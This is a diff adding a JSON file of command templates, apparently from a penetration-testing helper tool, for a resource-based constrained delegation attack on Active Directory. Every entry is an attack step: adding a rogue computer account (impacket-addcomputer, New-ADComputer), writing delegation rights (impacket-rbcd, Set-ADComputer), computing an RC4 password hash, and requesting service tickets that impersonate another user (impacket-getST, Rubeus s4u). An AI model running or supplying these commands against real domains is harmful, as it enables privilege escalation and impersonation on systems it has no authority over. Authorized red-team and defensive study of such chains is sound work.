@@ -1,0 +1,39 @@
+{
+  "commands": [
+    {
+      "title": "Create computer account (Linux - impacket-addcomputer)",
+      "description": "Create a new computer account on the domain using impacket-addcomputer tool.",
+      "template": "impacket-addcomputer -computer-name '{computer_name}$' -computer-pass '{computer_password}' -dc-host {domain_controller} '{domain}/{username}:{password}@'"
+    },
+    {
+      "title": "Assign RBCD delegation (impacket-rbcd)",
+      "description": "Write RBCD delegation from one computer account to another using impacket-rbcd.",
+      "template": "impacket-rbcd -delegate-from '{delegated_computer}$' -delegate-to '{target_computer}$' -dc-ip {ip} -action write '{domain}/{username}:{password}@'"
+    },
+    {
+      "title": "Get service ticket with impersonation (impacket-getST)",
+      "description": "Get a service ticket for a given SPN and impersonate a user using impacket-getST.",
+      "template": "impacket-getST -spn 'cifs/{target_computer}' -impersonate {target_object} -dc-ip {ip} -k '{domain}/{username}:{password}'"
+    },
+    {
+      "title": "Create computer account (Windows PowerShell)",
+      "description": "Create a new AD computer with a specified password.",
+      "template": "New-ADComputer -Name '{computer_name}' -Path '{ou_path}' -AccountPassword (ConvertTo-SecureString '{computer_password}' -AsPlainText -Force) -Enabled $true"
+    },
+    {
+      "title": "Set PrincipalsAllowedToDelegateToAccount (Windows PowerShell)",
+      "description": "Enable RBCD by setting delegation allowed principals on the target computer account.",
+      "template": "Set-ADComputer -Identity '{target_computer}' -PrincipalsAllowedToDelegateToAccount '{delegated_computer}$'"
+    },
+    {
+      "title": "Generate RC4 hash of password (Python snippet)",
+      "description": "Generate RC4 (MD4 of UTF-16LE password) hash for use in Rubeus or impacket.",
+      "template": "python3 -c \"import hashlib, binascii; print(binascii.hexlify(hashlib.new('md4', '{password}'.encode('utf-16le')).digest()).decode())\""
+    },
+    {
+      "title": "Request service ticket with impersonation (Rubeus)",
+      "description": "Request a ticket with impersonation using Rubeus and the RC4 hash of the password.",
+      "template": "Rubeus.exe s4u /u2u /user:{user} /rc4:{rc4_hash} /impersonateuser:{target_user} /msdsspn:cifs/{domain_controller}"
+    }
+  ]
+}
